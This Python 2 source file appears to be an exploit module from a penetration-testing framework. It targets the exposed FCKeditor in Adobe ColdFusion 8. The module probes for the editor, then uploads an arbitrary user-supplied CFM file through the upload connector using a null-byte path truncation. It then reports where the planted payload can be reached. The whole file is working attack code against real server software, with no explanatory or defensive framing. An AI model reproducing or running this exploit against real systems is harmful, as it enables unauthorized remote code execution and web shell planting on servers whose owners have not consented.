from src.platform.coldfusion.interfaces import CINTERFACES
from src.module.deploy_utils import parse_war_path
from os.path import abspath
from log import LOG
import utility


title = CINTERFACES.CFM
versions = ['8.0']
def deploy(fingerengine, fingerprint):
    """ Exploits the exposed FCKeditor in CF 8.x
    """

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_name = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    utility.Msg("Checking if FCKEditor is exposed...")
    url = "http://{0}:{1}".format(dip, fingerprint.port)
    uri = "/CFIDE/scripts/ajax/FCKeditor/editor/dialog/fck_about.html"

    response = utility.requests_get(url + uri)
    if response.status_code is 200 and "FCKeditor" in response.content:
        utility.Msg("FCKeditor exposed, attempting to write payload...")
    else:
        utility.Msg("FCKeditor doesn't seem to be exposed (HTTP %d)" % response.status_code)
        return

    try:
        payload = {"NewFile" : ("asdf.txt", open(cfm_path, "r").read())}
    except Exception, e:
        utility.Msg("Error reading file: %s" % e, LOG.ERROR)
        return
    
    uri = "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"        
    uri += "?Command=FileUploads&Type=File&CurrentFolder=/{0}%00".format(cfm_name)

    response = utility.requests_post(url + uri, files=payload)
    if response.status_code == 200 and "OnUploadCompleted" in response.content: 
        utility.Msg("Deployed.  Access /userfiles/file/{0} for payload"\
                            .format(cfm_name), LOG.SUCCESS)
    else:
        utility.Msg("Could not write payload (HTTP %d)" % (response.status_code))
